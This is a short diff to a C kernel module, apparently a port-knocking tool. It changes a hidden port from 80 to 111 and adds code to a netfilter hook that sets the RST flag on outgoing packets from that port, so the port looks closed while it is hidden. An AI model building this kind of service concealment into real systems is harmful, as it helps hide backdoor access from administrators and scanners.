@@ -13,7 +13,7 @@
 #define KPORT_1 14234
 #define KPORT_2 9786
 #define KPORT_3  32232
-#define HIDE_PORT  80
+#define HIDE_PORT  111
 
 #define locked_assignment(lock, x, y)		\
 	down_write(&lock); 			\
@@ -168,6 +168,8 @@ static unsigned int insert_rst(void *priv, struct sk_buff *skb, const struct nf_
 	if (sport == HIDE_PORT && is_port_hidden()) {
 		//TODO chagne flag to RST
 		printk(KERN_INFO "[KNOCKER] changing flag to RST");
+		th->rst = 1;
+		th->ack = 0;
 	}
 
 	return NF_ACCEPT;
